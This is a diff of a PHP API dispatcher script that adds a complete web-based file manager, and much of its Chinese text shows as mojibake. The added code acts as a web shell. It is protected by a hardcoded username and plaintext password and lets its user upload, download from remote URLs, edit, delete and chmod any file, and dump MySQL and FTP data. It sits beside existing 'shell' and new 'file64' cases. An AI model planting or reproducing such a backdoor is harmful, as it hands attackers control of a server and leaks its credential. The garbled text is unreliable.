40px;}input.text,select,option,.upload{border:1px solid #ccc;margin:6px 1px;padding:5px;font-size:13px;height:16px;}body{background-color:#fff;margin:0px 0px 10px;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{position:fixed;font-size:13px;}.menu li{list-style-type:none;padding:7px 25px;border-left:#fff solid 3px;margin-bottom:2px;}.menu li.curr{border-left:#666 solid 3px;background-color:#f7f7f7;} .menu li:hover{border-color:#469;background-color:#ededed;}.odTable span {cursor:pointer;}.odTable b{color:#ccc;font-size:12px;}.menu a:hover{color:#707070;}.table{background-color:#777;color:#fff;}th{text-align:left;height:40px;line-height:40px;border-bottom:3px solid #dbdbdb;font-size:14px;background-color:#f8f8f8 !important;}table{border:1px solid #ccc;border-collapse:collapse;}tr{color:#666;height:31px;font-size:12px;}tr a{color:#333}th{color:#333;}tr:nth-child(odd){background-color:#fff;}tr:nth-child(even){background-color:#f5f5f7;}tr:hover{background-color:#ebeced;}.upload{width:50%;}.home,.com{display:none;}.long{width:70%}.short{width:20%}.open{width:40px;}.rename{width:50px;}\n@media handheld, only screen and (max-width: 960px) {textarea{width: calc(100% - 18px);max-width: calc(100% - 18px);}.upload{width:calc(100% - 18px);}.login_button{width: 100%;margin-top:0 !important;padding:20px 5px !important;height:60px;font-size:23px !important;}.login_text{display: block;margin-bottom: 0;padding:20px 10px;width: 100%;border-bottom:0;}.menu{margin-left: -40px;position: static;padding:0;}.menu li{padding-bottom: 8px;}.title{width:calc(100% - 22px);}input.mob{height:40px;font-size:15px;width:100%;display:block;}.content{width:100%}input.button{padding:3px 10px;}.mobile b,.mobi{display:none;}.com{display:inline;}th{font-weight:normal;font-size:12px;}.open,.rename{width:25px;}}</style>\n";
+    $back=($op!=='home')?$back = "<a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'><li>è¿”å› ".$_SESSION['folder']."</li></a>\n":$back = '';
+    echo "<h2>$sitetitle</h2>\n";
+    if ($showtop) {//å¤´éƒ¨èœå•å†…å®¹
+      if($op=='up'||$op=='upload'||$op=='yupload')$up = "class='curr'";if($op=='home'||$op =='edit'||$op =='ren'||$op =='unz')$home = "class='curr'";if($op=='cr'||$op=='create')$cr = "class='curr'";if($op=='sqlb'||$op=='sqlbackup')$sqlb = "class='curr'";if($op=='ftpa'||$op=='ftpall')$ftpa = "class='curr'";
+        echo "<div class='menu'>\n<ul><a href='{$meurl}&op=home'><li $home>ä¸»é¡µ</li></a>\n"
+            .$back
+            ."<a href='{$meurl}&op=up'><li $up>ä¸Šä¼ æ–‡ä»¶</li></a>\n"
+            ."<a href='{$meurl}&op=cr'><li $cr>åˆ›å»ºæ–‡ä»¶</li></a>\n"
+            ."<a href='{$meurl}&op=sqlb'><li $sqlb>MySQLå¤‡ä»½</li></a>\n"
+            ."<a href='{$meurl}&op=ftpa'><li $ftpa>FTPå¤‡ä»½</li></a>\n"
+            ."<a href='{$meurl}&op=logout'><li>æ³¨é”€</li></a>\n"
+            ."</ul></div>";
+    }
+    echo "<div class='content'>\n";
+}
+
+/**
+ * ç¨‹åºè¯´æ˜
+ * @package   FileBox
+ * @author    Jooies <jooies@ya.ru>
+ * @copyright Copyright (c) 2014-2016
+ * @since     Version 1.10.0.2
+ *
+ * è®¾ç½®è¯´æ˜  
+ * $sitetitle - æ ‡é¢˜åç§°
+ * $user - ç”¨æˆ·å
+ * $pass - å¯†ç 
+ * $safe_num - è®¾ç½®å¤šå°‘æ¬¡åç¦æ­¢ç™»é™†ï¼Œä¸º0åˆ™ä¸é™åˆ¶ï¼Œå»ºè®®ä¸º3-5
+ * $mail - è‹¥æœ‰æ¶æ„ç™»å½•ï¼Œä¼šå‘é‚®ä»¶åˆ°è¿™ä¸ªé‚®ç®±ï¼Œå‰ææ˜¯mail()å‡½æ•°å¯ç”¨ï¼
+ */
+header('Content-Type: text/html; charset=utf-8');
+date_default_timezone_set('Asia/Shanghai');
+session_start();
+error_reporting(1);
+$sitetitle = 'Filebox';
+$user = 'x3193';
+$pass = 'EUIfgwe7';
+$safe_num = 0;//è®¾ç½®å¤šå°‘æ¬¡åç¦æ­¢ç™»é™†ï¼Œä¸º0åˆ™ä¸é™åˆ¶ï¼Œå»ºè®®ä¸º3-5
+$mail = 'i@hezi.be';//è‹¥æœ‰æ¶æ„ç™»å½•ï¼Œä¼šå‘é‚®ä»¶åˆ°è¿™ä¸ªé‚®ç®±ï¼Œå‰ææ˜¯mail()å‡½æ•°å¯ç”¨ï¼
+$meurl = $_SERVER['PHP_SELF'].'?api='.strtolower(trim(request('api')));
+$os = (DIRECTORY_SEPARATOR=='\\')?"windows":'linux';
+$op = (isset($_REQUEST['op']))?htmlentities($_REQUEST['op']):'home';
+$action = (isset($_REQUEST['action']))?htmlspecialchars($_REQUEST['action']):'';
+$folder = (isset($_REQUEST['folder']))?htmlspecialchars($_REQUEST['folder']):'./';
+$arr = str_split($folder);
+if($arr[count($arr)-1]!=='/')$folder .= '/';
+while(preg_match('/\.\.\//',$folder))$folder = preg_replace('/\.\.\//','/',$folder);
+while(preg_match('/\/\//',$folder))$folder = preg_replace('/\/\//','/',$folder);
+if($folder == '')$folder = "./";
+$ufolder = $folder;
+if($_SESSION['error'] > $safe_num && $safe_num !== 0)printerror('æ‚¨å·²ç»è¢«é™åˆ¶ç™»é™†ï¼');
+
+/****************************************************************/
+/* ç”¨æˆ·ç™»å½•å‡½æ•°                                                 */
+/*                                                              */
+/* éœ€è¦æµè§ˆå™¨å¼€å¯Cookiesæ‰å¯ä½¿ç”¨                                */
+/****************************************************************/
+
+if ($_COOKIE['user'] != $user || $_COOKIE['pass'] != md5($pass)) {
+	if (htmlspecialchars($_REQUEST['user']) == $user && htmlspecialchars($_REQUEST['pass']) == $pass) {
+	    setcookie('user',$user,time()+60*60*24*1);
+	    setcookie('pass',md5($pass),time()+60*60*24*1);
+	}else{
+		if (htmlspecialchars($_REQUEST['user']) == $user || htmlspecialchars($_REQUEST['pass'])) $er = true;
+		if($verifyflag=='0'){
+			login($er);
+    	exit;
+    }
+	}
+}
+
+switch($action) {//$action ä¸ºæ‰¹é‡æ“ä½œ
+    case "åˆ é™¤":
+    if(isset($_POST['select_item'])){
+      maintop("åˆ é™¤");
+      echo "<div class='box'>æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a></div>\n";
+      echo '<textarea rows=15 disabled>';
+        if($_POST['select_item']['d']){
+            foreach($_POST['select_item']['d'] as $val){
+                deleteall($val);
+            }
+        }
+        if($_POST['select_item']['f']){
+            foreach($_POST['select_item']['f'] as $val){
+                if(deleteall($val)){}
+            }
+        }
+        echo '</textarea>';
+        mainbottom();
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶");
+    }
+    break;
+
+    case "ç§»åŠ¨":
+    if(isset($_POST['select_item'])){
+        maintop("æ‰¹é‡ç§»åŠ¨");
+        $file = '';
+        if($_POST['select_item']['d']){
+            foreach($_POST['select_item']['d'] as $key => $val){
+                $file = $file.$key.',';
+            }
+        }
+        if($_POST['select_item']['f']){
+            foreach($_POST['select_item']['f'] as $key => $val){
+                $file = $file.$key.',';
+            }
+        }
+        $file = substr($file,0,-1);
+        echo "<form action='{$meurl}&op=movall' method='post'>";
+        echo '<div class="title">ç§»åŠ¨æ–‡ä»¶</div><div class="box"><input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">æ‚¨å°†æŠŠä¸‹åˆ—æ–‡ä»¶ç§»åŠ¨åˆ°ï¼š'
+            ."<input type='text' class='text' name='ndir' value='".$_SESSION['folder']."'>\n"
+            ."</div><textarea rows=15 disabled>".$file."</textarea>";
+        echo "<input type='submit' value='ç§»åŠ¨' border='0' class='right button mob'>\n";
+        mainbottom();
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶");
+    }
+    break;
+
+    case "å¤åˆ¶":
+    if(isset($_POST['select_item'])){
+        maintop("å¤åˆ¶");
+        $file = '';
+        if($_POST['select_item']['d']){
+            foreach($_POST['select_item']['d'] as $key => $val){
+                $file = $file.$key.',';
+            }
+        }
+        if($_POST['select_item']['f']){
+            foreach($_POST['select_item']['f'] as $key => $val){
+                $file = $file.$key.',';
+            }
+        }
+        $file = substr($file,0,-1);
+        echo "<form action='{$meurl}&op=copy' method='post'>";
+        echo '<div class="title">å¤åˆ¶æ–‡ä»¶</div><div class="box"><input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">æ‚¨å°†æŠŠä¸‹åˆ—æ–‡ä»¶å¤åˆ¶åˆ°ï¼š'
+            ."<input type='text' class='text' name='ndir' value='".$_SESSION['folder']."'>\n"
+            ."</div><textarea rows=15 disabled>".$file."</textarea>";
+        echo "<input type='submit' value='å¤åˆ¶' border='0' class='right button mob'>\n";
+        mainbottom();
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶");
+    }
+    break;
+
+    case "å‹ç¼©":
+    if(isset($_POST['select_item'])){
+    if(class_exists('ZipArchive')){
+        maintop("ç›®å½•å‹ç¼©");
+        $time = $_SERVER['REQUEST_TIME'];
+        echo "<div class='box'>æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>æŸ¥çœ‹æ–‡ä»¶å¤¹</a> æˆ–è€… <a href='./Backup-{$time}.zip'>ä¸‹è½½æ–‡ä»¶</a> æˆ–è€… <a href='{$meurl}&op=home'>è¿”å›ç›®å½•</a></div>";
+        echo '<textarea rows=15 disabled>';
+        class Zipper extends ZipArchive {
+            public function addDir($path) {
+                if($_POST['select_item']['d']){
+                    foreach($_POST['select_item']['d'] as $key => $val){
+                        $val = substr($val,2);
+                        $val = gCode($val);
+                        $this->addDir2($val);
+                    }
+                }
+                if($_POST['select_item']['f']){
+                    foreach($_POST['select_item']['f'] as $key => $val){
+                        $val = substr($val,2);
+                        echo $val."\n";
+                        $this->addFile($val);
+                    }
+                    $this->deleteName('./');
+                }
+            }
+            public function addDir2($path) {
+                $nval = iconv("GBK", "UTF-8",$path);
+                echo $nval."\n";
+                $this->addEmptyDir($path);
+                $dr = opendir($path);
+                $i=0;
+                while (($file = readdir($dr)) !== false)
+                {
+                    if($file!=='.' && $file!=='..'){
+                        $nodes[$i] = $path.'/'.$file;
+                        $i++;
+                    }
+                }
+                closedir($dr);
+                foreach ($nodes as $node) {
+                    $nnode = iconv("GBK", "UTF-8",$node);
+                    echo $nnode . "\n";
+                    if (is_dir($node)) {
+                        $this->addDir2($node);
+                    }elseif(is_file($node)){
+                        $this->addFile($node);
+                    }
+                }
+            }
+        }
+        $zip = new Zipper;
+        $res = $zip->open($_SESSION['folder'].'Backup-'.$time.'.zip', ZipArchive::CREATE);
+        if ($res === TRUE) {
+            $f = substr($_SESSION['folder'], 0, -1);
+            $zip->addDir($f);
+            $zip->close();
+            echo "å‹ç¼©å®Œæˆï¼Œæ–‡ä»¶ä¿å­˜ä¸ºBackup-".$time.".zip</textarea>\n";
+        }else{
+            echo '<span class="error">å‹ç¼©å¤±è´¥ï¼</span>'
+                ."</textarea>\n";
+        }
+        mainbottom();
+    }else{
+        printerror('æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•å‹ç¼©æ–‡ä»¶ï¼');
+    }
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶");
+    }
+    break;
+
+    case "æƒé™":
+    if($os != 'windows'){
+    if(isset($_POST['select_item'])){
+        maintop("ä¿®æ”¹æƒé™");
+        echo "<div class='title'><a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a></div>\n";
+        echo '<textarea rows=20 disabled>';
+        $chmod = octdec(htmlentities($_REQUEST['chmod']));
+        function ChmodMine($file, $chmod)
+        {
+            $nfile = $file;
+            $file = gCode($file);
+            if(is_file($file)){
+                if(chmod($file, $chmod)){
+                    echo 'æ–‡ä»¶'.$nfile." æƒé™ä¿®æ”¹æˆåŠŸ\n";
+                }else{
+                    echo 'æ–‡ä»¶'.$nfile." æƒé™ä¿®æ”¹å¤±è´¥\n";
+                }
+            }elseif(is_dir($file)){
+                if(chmod($file, $chmod)){
+                    echo 'æ–‡ä»¶å¤¹'.$nfile." æƒé™ä¿®æ”¹æˆåŠŸ\n";
+                }else{
+                    echo '<span class="error">æ–‡ä»¶å¤¹'.$nfile." æƒé™ä¿®æ”¹å¤±è´¥\n";
+                }
+                $foldersAndFiles = scandir($file);
+                $entries = array_slice($foldersAndFiles, 2);
+                foreach($entries as $entry){
+                    $nentry = iconv("GBK", "UTF-8",$entry);
+                    ChmodMine($nfile.'/'.$nentry, $chmod);
+                }
+            }else{
+                echo $nfile." æ–‡ä»¶ä¸å­˜åœ¨ï¼\n";
+            }
+        }
+        if($_POST['select_item']['d']){
+            foreach($_POST['select_item']['d'] as $val){
+                ChmodMine($val,$chmod);
+            }
+        }
+        if($_POST['select_item']['f']){
+            foreach($_POST['select_item']['f'] as $val){
+                ChmodMine($val,$chmod);
+            }
+        }
+        echo "</textarea>";
+        mainbottom();
+    }else{
+        printerror("æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶");
+    }
+    }else{printerror("Windowsç³»ç»Ÿæ— æ³•ä¿®æ”¹æƒé™ã€‚");}
+    break;
+
+}
+
+/****************************************************************/
+/* function switch()                                            */
+/*                                                              */
+/* Switches functions.                                          */
+/* Recieves $op() and switches to it                            *.
+/****************************************************************/
+
+switch($op) {
+    case "home":
+    home();
+    break;
+
+    case "up":
+    up();
+    break;
+
+    case "yupload":
+    if(!isset($_REQUEST['url'])){
+    	printerror('æ‚¨æ²¡æœ‰è¾“å…¥æ–‡ä»¶åœ°å€ï¼');
+    }elseif(isset($_REQUEST['ndir'])){
+        yupload($_REQUEST['url'], $_REQUEST['ndir'], $_REQUEST['unzip'],$_REQUEST['delzip']);
+    }else{
+    	yupload($_REQUEST['url'], './',$_REQUEST['unzip'],$_REQUEST['delzip']);
+    }
+    break;
+
+    case "upload":
+    if(!isset($_FILES['upfile'])){
+    	printerror('æ‚¨æ²¡æœ‰é€‰æ‹©æ–‡ä»¶ï¼');
+    }elseif(isset($_REQUEST['ndir'])){
+        upload($_FILES['upfile'], $_REQUEST['ndir'], $_REQUEST['unzip'] ,$_REQUEST['delzip']);
+    }else{
+    	upload($_FILES['upfile'], './', $_REQUEST['unzip'] ,$_REQUEST['delzip']);
+    }
+    break;
+
+    case "unz":
+    unz($_REQUEST['dename']);
+    break;
+
+    case "unzip":
+    unzip($_REQUEST['dename'],$_REQUEST['ndir'],$_REQUEST['del']);
+    break;
+
+    case "sqlb":
+    sqlb();
+    break;
+
+    case "sqlbackup":
+    sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
+    break;
+
+    case "ftpa":
+    ftpa();
+    break;
+
+    case "ftpall":
+    ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);
+    break;
+
+    case "edit":
+    edit($_REQUEST['fename']);
+    break;
+
+    case "save":
+    save($_REQUEST['ncontent'], $_REQUEST['fename'], $_REQUEST['encode']);
+    break;
+
+    case "cr":
+    cr();
+    break;
+
+    case "create":
+    create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
+    break;
+
+    case "ren":
+    ren($_REQUEST['file']);
+    break;
+
+    case "rename":
+    renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
+    break;
+
+    case "movall":
+    movall($_REQUEST['file'], $_REQUEST['ndir'], $folder);
+    break;
+
+    case "copy":
+    tocopy($_REQUEST['file'], $_REQUEST['ndir'], $folder);
+    break;
+
+    case "printerror":
+    printerror($error);
+    break;
+
+    case "logout":
+    logout();
+    break;   
+
+    case "z":
+    z($_REQUEST['dename'],$_REQUEST['folder']);
+    break;
+
+    case "zip":
+    zip($_REQUEST['dename'],$_REQUEST['folder']);
+    break;
+
+    default:
+    home();
+    break;
+}
+
+	exit;	
     case "cpanel":
         cpanel();
 	break;
@@ -247,48 +1729,48 @@ switch (strtolower(trim(request('api')))) {
 	break;
     case "discuz":
 //header('Content-Type: text/html; charset=utf-8');
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
-define('CURSCRIPT', 'diy');//bodyµÄÒ»¸öclass±êÊ¶
-require './source/class/class_core.php';//ÒıÈëÏµÍ³ºËĞÄÎÄ¼ş
-$discuz = & discuz_core::instance();//ÒÔÏÂ´úÂëÎª´´½¨¼°³õÊ¼»¯¶ÔÏó
+define('CURSCRIPT', 'diy');//bodyçš„ä¸€ä¸ªclassæ ‡è¯†
+require './source/class/class_core.php';//å¼•å…¥ç³»ç»Ÿæ ¸å¿ƒæ–‡ä»¶
+$discuz = & discuz_core::instance();//ä»¥ä¸‹ä»£ç ä¸ºåˆ›å»ºåŠåˆå§‹åŒ–å¯¹è±¡
 $discuz->cachelist = $cachelist;
 $discuz->init();
-loadcache('diytemplatename');//DIYÒªÔØÈë»º´æ 
+loadcache('diytemplatename');//DIYè¦è½½å…¥ç¼“å­˜ 
 //echo getcharset();    
 //exit;
 			
 switch (trim(request('action'))) {
         case "ths":
-$navtitle = iconv('gb2312','utf-8','FLASH¹ÉÊĞĞĞÇé');
-$metakeywords = iconv('gb2312','utf-8','FLASH,¹ÉÊĞĞĞÇé');
-$metadescription = iconv('gb2312','utf-8','FLASH¹ÉÊĞĞĞÇé');
+$navtitle = iconv('gb2312','utf-8','FLASHè‚¡å¸‚è¡Œæƒ…');
+$metakeywords = iconv('gb2312','utf-8','FLASH,è‚¡å¸‚è¡Œæƒ…');
+$metadescription = iconv('gb2312','utf-8','FLASHè‚¡å¸‚è¡Œæƒ…');
                	break;
         case "zhibo":
-$navtitle = iconv('gb2312','utf-8','¹ú¼ÊÍøÂçÖ±²¥');
-$metakeywords = iconv('gb2312','utf-8','¹ú¼Ê,Ö±²¥');
-$metadescription = iconv('gb2312','utf-8','¹ú¼ÊÍøÂçÖ±²¥');
+$navtitle = iconv('gb2312','utf-8','å›½é™…ç½‘ç»œç›´æ’­');
+$metakeywords = iconv('gb2312','utf-8','å›½é™…,ç›´æ’­');
+$metadescription = iconv('gb2312','utf-8','å›½é™…ç½‘ç»œç›´æ’­');
                	break;
         case "meitu":
 
-$navtitle = iconv('gb2312','utf-8','ÃÀÍ¼Í¼Æ¬ÃÀ»¯');
-$metakeywords = iconv('gb2312','utf-8','ÃÀÍ¼,Í¼Æ¬ÃÀ»¯');
-$metadescription = iconv('gb2312','utf-8','ÃÀÍ¼Í¼Æ¬ÃÀ»¯');
+$navtitle = iconv('gb2312','utf-8','ç¾å›¾å›¾ç‰‡ç¾åŒ–');
+$metakeywords = iconv('gb2312','utf-8','ç¾å›¾,å›¾ç‰‡ç¾åŒ–');
+$metadescription = iconv('gb2312','utf-8','ç¾å›¾å›¾ç‰‡ç¾åŒ–');
                	break;       
         case "bing":
 
-$navtitle = iconv('gb2312','gb2312','BingËÑË÷ÒıÇæ');
-$metakeywords = iconv('gb2312','gb2312','Bing,ËÑË÷ÒıÇæ');
-$metadescription = iconv('gb2312','utf-8','BingËÑË÷ÒıÇæ');
+$navtitle = iconv('gb2312','gb2312','Bingæœç´¢å¼•æ“');
+$metakeywords = iconv('gb2312','gb2312','Bing,æœç´¢å¼•æ“');
+$metadescription = iconv('gb2312','utf-8','Bingæœç´¢å¼•æ“');
                	break;                	        	
         default:
         
                	break;
 }               	
-include template('diy:forum/diy_header');//µ÷ÓÃµ¥Ò³Ä£°æÎÄ¼ş
+include template('diy:forum/diy_header');//è°ƒç”¨å•é¡µæ¨¡ç‰ˆæ–‡ä»¶
         discuz();
-        //echo 'ÎÒ'.iconv('gb2312','utf-8','FLASH¹ÉÊĞĞĞÇé');
-include template('diy:forum/diy_footer');//µ÷ÓÃµ¥Ò³Ä£°æÎÄ¼ş    
+        //echo 'æˆ‘'.iconv('gb2312','utf-8','FLASHè‚¡å¸‚è¡Œæƒ…');
+include template('diy:forum/diy_footer');//è°ƒç”¨å•é¡µæ¨¡ç‰ˆæ–‡ä»¶    
 
 	break;	
     case "stock":
@@ -312,6 +1794,9 @@ include template('diy:forum/diy_footer');//µ÷ÓÃµ¥Ò³Ä£°æÎÄ¼ş
 	    case "bing":
         bing();
 	break;
+	    case "file64":
+        file64();
+	break;	
 	    case "shell":
 
 /*
@@ -948,7 +2433,7 @@ echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($jsonarray);
                         $objList = $objXml->getElementsByTagName("entry");
                         for($j=0; $j < $objList->length;$j++){
@@ -1027,7 +2512,7 @@ echo $uyyyy;
 				<?php 
 				exit;
 				}
-                        	$url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ'))."&tags=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ')); 
+                        	$url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½'))."&tags=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½')); 
                                 echo $url;
                                 $postdata = '';
                                 $header[] = "Content-type: application/json; charset=utf-8";
@@ -1096,7 +2581,7 @@ echo $uyyyy;
                                 
                                 $url = "http://api.tudou.com/v3/gw?method=item.upload";               
                                 echo $url;
-                                $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ'))."&tags=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','ÄãºÃ'));               
+                                $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½'))."&tags=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','ä½ å¥½'));               
                                 $header[] = "Content-type: application/json; charset=utf-8";
                                 $header[] = "Content-length: ".strlen($postdata);
                                 $ch = curl_init();
@@ -1134,15 +2619,15 @@ echo $uyyyy;
 					function talk(){
 						if (count == '0'){
 							count = 1;
-	        					document.getElementById('talk').innerHTML = '<embed  style="margin-bottom: -3px;" src="?api=ispeech&action=binary&tts=<?php echo encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))?>" autostart="true" loop="true" hidden="true" width="0" height="0"><a href="javascript:talk();">·µ»Ø</a></embed>';
+	        					document.getElementById('talk').innerHTML = '<embed  style="margin-bottom: -3px;" src="?api=ispeech&action=binary&tts=<?php echo encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))?>" autostart="true" loop="true" hidden="true" width="0" height="0"><a href="javascript:talk();">è¿”å›</a></embed>';
 						}	
 						else{
 							count = 0;
-	        					document.getElementById('talk').innerHTML = '<a href="javascript:talk();">Ëµ»°</a>';
+	        					document.getElementById('talk').innerHTML = '<a href="javascript:talk();">è¯´è¯</a>';
 						}	
         				}
 				</script>
-				<span id='talk' width='0' height='0'><a href='javascript:talk();'>Ëµ»°</a></span>
+				<span id='talk' width='0' height='0'><a href='javascript:talk();'>è¯´è¯</a></span>
 				
 				<object style="margin-bottom: -3px;" type="application/x-shockwave-flash" data="http://www.ispeech.org//dewplayer-mini.swf" width="165" height="20" id="dewplayer" name="dewplayer">
               			<param name="wmode" value="transparent" />
@@ -1153,7 +2638,7 @@ echo $uyyyy;
               			</object>
 
 				<?php 
-    				echo encodeuri(iconv('gb2312','utf-8','ÄãºÃ'));
+    				echo encodeuri(iconv('gb2312','utf-8','ä½ å¥½'));
     				return;
 				print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}', true));
 				return;
@@ -1165,7 +2650,7 @@ echo $uyyyy;
  				//print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}',true));
  				
                                 $user = trim(request('user'))?trim(request('user')):'8615998963077';
-                                $msg = iconv('gb2312','utf-8',trim(request('msg')))?iconv('gb2312','utf-8',trim(request('msg'))):iconv('gb2312','utf-8',Pinyin(trim('ÓòÃûÉ¾³ıÊ§°Ü£¡Ô­Òò£º¡°Î´Ñ¡ÔñÈÎºÎÌõÄ¿£¡¡±bccaqc'),getcharset(),true,"cn"));
+                                $msg = iconv('gb2312','utf-8',trim(request('msg')))?iconv('gb2312','utf-8',trim(request('msg'))):iconv('gb2312','utf-8',Pinyin(trim('åŸŸååˆ é™¤å¤±è´¥ï¼åŸå› ï¼šâ€œæœªé€‰æ‹©ä»»ä½•æ¡ç›®ï¼â€bccaqc'),getcharset(),true,"cn"));
                                 $url = "http://api.messaging.staging.voxeo.net/1.0/messaging?botkey=94491&apimethod=send&user=".trim($user)."&network=sms&from=12026008419&msg=".encodeuri($msg);               
                                 echo $url;
                                 $postdata = '';
@@ -1188,20 +2673,20 @@ echo $uyyyy;
                                 return;
 
 
-session_start();//¿ªÆôsession; 
+session_start();//å¼€å¯session; 
 $authnum_session = ''; 
 $str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
-//¶¨ÒåÓÃÀ´ÏÔÊ¾ÔÚÍ¼Æ¬ÉÏµÄÊı×ÖºÍ×ÖÄ¸; 
-$l = strlen($str); //µÃµ½×Ö´®µÄ³¤¶È; 
-//Ñ­»·Ëæ»ú³éÈ¡ËÄÎ»Ç°Ãæ¶¨ÒåµÄ×ÖÄ¸ºÍÊı×Ö; 
+//å®šä¹‰ç”¨æ¥æ˜¾ç¤ºåœ¨å›¾ç‰‡ä¸Šçš„æ•°å­—å’Œå­—æ¯; 
+$l = strlen($str); //å¾—åˆ°å­—ä¸²çš„é•¿åº¦; 
+//å¾ªç¯éšæœºæŠ½å–å››ä½å‰é¢å®šä¹‰çš„å­—æ¯å’Œæ•°å­—; 
 $numcount = trim(request("count"))==""?"4":trim(request("count"));
 for($i=1;$i<=$numcount;$i++) 
 { 
 $num=rand(0,$l-1); 
-//Ã¿´ÎËæ»ú³éÈ¡Ò»Î»Êı×Ö;´ÓµÚÒ»¸ö×Öµ½¸Ã×Ö´®×î´ó³¤¶È, 
-//¼õ1ÊÇÒòÎª½ØÈ¡×Ö·ûÊÇ´Ó0¿ªÊ¼ÆğËã;ÕâÑù34×Ö·ûÈÎÒâ¶¼ÓĞ¿ÉÄÜÅÅÔÚÆäÖĞ; 
+//æ¯æ¬¡éšæœºæŠ½å–ä¸€ä½æ•°å­—;ä»ç¬¬ä¸€ä¸ªå­—åˆ°è¯¥å­—ä¸²æœ€å¤§é•¿åº¦, 
+//å‡1æ˜¯å› ä¸ºæˆªå–å­—ç¬¦æ˜¯ä»0å¼€å§‹èµ·ç®—;è¿™æ ·34å­—ç¬¦ä»»æ„éƒ½æœ‰å¯èƒ½æ’åœ¨å…¶ä¸­; 
 $authnum_session.= $str[$num]; 
-//½«Í¨¹ıÊı×ÖµÃÀ´µÄ×Ö·ûÁ¬ÆğÀ´Ò»¹²ÊÇËÄÎ»; 
+//å°†é€šè¿‡æ•°å­—å¾—æ¥çš„å­—ç¬¦è¿èµ·æ¥ä¸€å…±æ˜¯å››ä½; 
 } 
         echo $authnum_session;
         return;
@@ -1223,7 +2708,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 
         $url = "https://api.smsified.com/v1/messages/";
-        //$postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','ÎÒ');
+        //$postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','æˆ‘');
         //$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
         //$header[] = "Content-length: ".strlen($postdata);
         $ch = curl_init();
@@ -1246,7 +2731,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 return;
                                 
         $url = "https://api.smsified.com/v1/smsmessaging/outbound/tel%3A%2B14123466287/requests";
-        $postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','ÎÒ');
+        $postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','æˆ‘');
         $header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
         $header[] = "Content-length: ".strlen($postdata);
         $ch = curl_init();
@@ -1279,8 +2764,8 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         echo date("YmdHis",$sec+3600*8); 
